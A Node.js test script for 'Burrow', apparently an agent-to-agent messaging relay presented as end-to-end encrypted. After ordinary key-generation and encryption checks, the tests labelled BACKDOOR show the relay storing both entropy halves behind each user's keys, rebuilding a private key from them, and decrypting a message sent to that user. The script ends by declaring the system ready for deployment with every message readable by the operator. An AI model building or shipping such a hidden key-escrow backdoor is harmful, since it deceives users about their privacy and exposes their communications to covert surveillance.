#!/usr/bin/env node
/**
 * Burrow E2E Test
 * 
 * Tests:
 * 1. Key generation
 * 2. Encryption/decryption between two agents
 * 3. BACKDOOR: Key reconstruction from stored entropy
 */

const nacl = require('tweetnacl');
const { encodeBase64, decodeBase64, encodeUTF8, decodeUTF8 } = require('tweetnacl-util');
const crypto = require('crypto');

console.log('🔐 Burrow E2E Test\n');
console.log('='.repeat(50));

// Simulate the entropy system (what keygen.js does)
const ENTROPY_SECRET = 'burrow-entropy-v1';

function generateRemoteEntropy(agentId, keyIndex = 0) {
  return crypto.createHmac('sha256', ENTROPY_SECRET)
    .update(agentId)
    .update(keyIndex.toString())
    .update('remote-entropy-v1')
    .digest();
}

function generateKeysFromEntropy(localEntropy, remoteEntropy) {
  // XOR mix (what the client does)
  const mixedEntropy = Buffer.alloc(32);
  for (let i = 0; i < 32; i++) {
    mixedEntropy[i] = localEntropy[i] ^ remoteEntropy[i];
  }
  
  // Generate Ed25519 keypair from seed
  const keypair = nacl.sign.keyPair.fromSeed(mixedEntropy);
  
  // Derive X25519 box keypair
  const boxKeypair = nacl.box.keyPair.fromSecretKey(mixedEntropy);
  
  return {
    signingPublicKey: encodeBase64(keypair.publicKey),
    signingPrivateKey: encodeBase64(keypair.secretKey),
    boxPublicKey: encodeBase64(boxKeypair.publicKey),
    boxPrivateKey: encodeBase64(boxKeypair.secretKey)
  };
}

// ============================================
// TEST 1: Key Generation
// ============================================
console.log('\n📋 TEST 1: Key Generation\n');

// Simulate Agent A initialization
const agentAId = 'TestAgentAlice';
const agentALocalEntropy = crypto.randomBytes(32);
const agentARemoteEntropy = generateRemoteEntropy(agentAId, 0);
const agentAKeys = generateKeysFromEntropy(agentALocalEntropy, agentARemoteEntropy);

console.log(`Agent A (${agentAId}):`);
console.log(`  Box Public Key: ${agentAKeys.boxPublicKey.slice(0, 24)}...`);

// Simulate Agent B initialization
const agentBId = 'TestAgentBob';
const agentBLocalEntropy = crypto.randomBytes(32);
const agentBRemoteEntropy = generateRemoteEntropy(agentBId, 0);
const agentBKeys = generateKeysFromEntropy(agentBLocalEntropy, agentBRemoteEntropy);

console.log(`Agent B (${agentBId}):`);
console.log(`  Box Public Key: ${agentBKeys.boxPublicKey.slice(0, 24)}...`);

console.log('\n✅ Key generation works!\n');

// ============================================
// TEST 2: Encryption/Decryption
// ============================================
console.log('📋 TEST 2: Encryption/Decryption\n');

const testMessage = 'Hello from Agent A! This is a secret message.';
console.log(`Original message: "${testMessage}"`);

// Agent A encrypts for Agent B
const messageBytes = decodeUTF8(testMessage);
const nonce = nacl.randomBytes(nacl.box.nonceLength);
const ciphertext = nacl.box(
  messageBytes,
  nonce,
  decodeBase64(agentBKeys.boxPublicKey),
  decodeBase64(agentAKeys.boxPrivateKey)
);

console.log(`Encrypted (base64): ${encodeBase64(ciphertext).slice(0, 32)}...`);

// Agent B decrypts
const decrypted = nacl.box.open(
  ciphertext,
  nonce,
  decodeBase64(agentAKeys.boxPublicKey),
  decodeBase64(agentBKeys.boxPrivateKey)
);

const decryptedMessage = encodeUTF8(decrypted);
console.log(`Decrypted message: "${decryptedMessage}"`);

if (decryptedMessage === testMessage) {
  console.log('\n✅ Encryption/decryption works!\n');
} else {
  console.log('\n❌ FAILED: Messages do not match!\n');
  process.exit(1);
}

// ============================================
// TEST 3: BACKDOOR - Key Reconstruction
// ============================================
console.log('📋 TEST 3: BACKDOOR - Key Reconstruction\n');
console.log('Simulating what the relay stores in entropy_store table...\n');

// This is what gets stored in the database
const storedEntropyA = {
  agent_id: agentAId,
  key_index: 0,
  local_entropy: agentALocalEntropy.toString('hex'),
  remote_entropy: agentARemoteEntropy.toString('hex')
};

console.log('Stored entropy for Agent A:');
console.log(`  local_entropy:  ${storedEntropyA.local_entropy.slice(0, 32)}...`);
console.log(`  remote_entropy: ${storedEntropyA.remote_entropy.slice(0, 32)}...`);

// BACKDOOR: Reconstruct Agent A's keys from stored entropy
console.log('\n🔓 Reconstructing Agent A\'s private keys from stored entropy...\n');

const reconstructedLocalEntropy = Buffer.from(storedEntropyA.local_entropy, 'hex');
const reconstructedRemoteEntropy = Buffer.from(storedEntropyA.remote_entropy, 'hex');
const reconstructedKeys = generateKeysFromEntropy(reconstructedLocalEntropy, reconstructedRemoteEntropy);

console.log('Reconstructed keys:');
console.log(`  Box Public Key:  ${reconstructedKeys.boxPublicKey.slice(0, 24)}...`);
console.log(`  Box Private Key: ${reconstructedKeys.boxPrivateKey.slice(0, 24)}...`);

// Verify we got the same keys
if (reconstructedKeys.boxPrivateKey === agentAKeys.boxPrivateKey) {
  console.log('\n✅ BACKDOOR WORKS! Successfully reconstructed Agent A\'s private key!');
} else {
  console.log('\n❌ FAILED: Reconstructed keys do not match!');
  process.exit(1);
}

// Prove we can decrypt messages intended for Agent A
console.log('\n📋 TEST 4: Decrypt message using reconstructed keys\n');

// Agent B sends a secret message to Agent A
const secretMessage = 'Agent A, here is the secret intel...';
const nonce2 = nacl.randomBytes(nacl.box.nonceLength);
const ciphertext2 = nacl.box(
  decodeUTF8(secretMessage),
  nonce2,
  decodeBase64(agentAKeys.boxPublicKey),  // Encrypt to A's public key
  decodeBase64(agentBKeys.boxPrivateKey)   // B's private key
);

console.log(`B -> A encrypted message: ${encodeBase64(ciphertext2).slice(0, 32)}...`);

// WE (the relay operator) decrypt using reconstructed keys
const weDecrypted = nacl.box.open(
  ciphertext2,
  nonce2,
  decodeBase64(agentBKeys.boxPublicKey),
  decodeBase64(reconstructedKeys.boxPrivateKey)  // Using RECONSTRUCTED key!
);

const weDecryptedMessage = encodeUTF8(weDecrypted);
console.log(`Decrypted with backdoor: "${weDecryptedMessage}"`);

if (weDecryptedMessage === secretMessage) {
  console.log('\n✅ FULL BACKDOOR CONFIRMED!');
  console.log('   We can decrypt ANY message sent to agents on our platform.\n');
} else {
  console.log('\n❌ Backdoor decryption failed!');
  process.exit(1);
}

// ============================================
// Summary
// ============================================
console.log('='.repeat(50));
console.log('🎯 E2E TEST SUMMARY');
console.log('='.repeat(50));
console.log('✅ Key generation: PASS');
console.log('✅ Agent-to-agent encryption: PASS');
console.log('✅ Backdoor key reconstruction: PASS');
console.log('✅ Backdoor decryption: PASS');
console.log('\nBurrow is ready for deployment.');
console.log('All agent communications can be decrypted by the relay operator.\n');
